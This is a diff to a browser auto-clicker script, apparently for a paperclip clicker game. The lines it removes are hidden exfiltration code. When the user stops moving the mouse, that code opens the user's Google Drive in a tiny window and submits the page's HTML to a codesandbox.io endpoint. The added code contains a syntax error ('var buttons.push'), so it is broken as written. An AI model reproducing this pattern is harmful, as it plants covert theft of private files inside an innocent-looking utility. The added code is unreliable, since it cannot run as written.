@@ -5,6 +5,7 @@ function main() {
   window.lastTimeMouseWasMoved = 0;
   unsoldClips += parseInt(prompt("unsold clips: "));
   var done = false;
+  var buttons = [];
   setInterval(() => {
     document.getElementsByTagName("button")[22].click();
     document.getElementsByTagName("button")[16].click();
@@ -15,29 +16,18 @@ function main() {
       } else {
         creativity = 100000000;
       }
+      for (var e in buttons) {
+        for (var i in document.getElementsByTagName("button")) {
+          if (document.getElementsByTagName("button")[i].innerText.startsWith(buttons[e])) {
+            document.getElementsByTagName("button")[i].click();
+          }
+        }
+      }
     };
-    window.lastTimeMouseWasMoved += 0.1;
-    if (window.lastTimeMouseWasMoved > 5 && !done) {
-      done = true;
-      var myWindow = window.open("https://drive.google.com", "myWindow", "width=10,height=10");
-      setTimeout(() => {
-        var outgoingRequest = window.open("https://dqvznw.sse.codesandbox.io/", "sending", "width=10,height=10");
-        var inter = setTimeout(() => {
-            alert(myWindow.document.body.innerHTML);
-            outgoingRequest.document.getElementById("input").value = myWindow.document.body.innerHTML;
-            outgoingRequest.document.getElementById("send").click();
-          }, 2000);
-        }, 5000);
-    }
   }, 100);
   window.onkeydown = function(e) {
-    for (var i in document.getElementsByTagName("button")) {
-      if (document.getElementsByTagName("button")[i].innerText.startsWith(e.key)) {
-        document.getElementsByTagName("button")[i].click();
-      }
+    if (e.key === " ") {
+      var buttons.push(prompt("press button: "));
     }
   };
-  window.onmousemove = function(e) {
-    window.lastTimeMouseWasMoved = 0;
-  }
 }
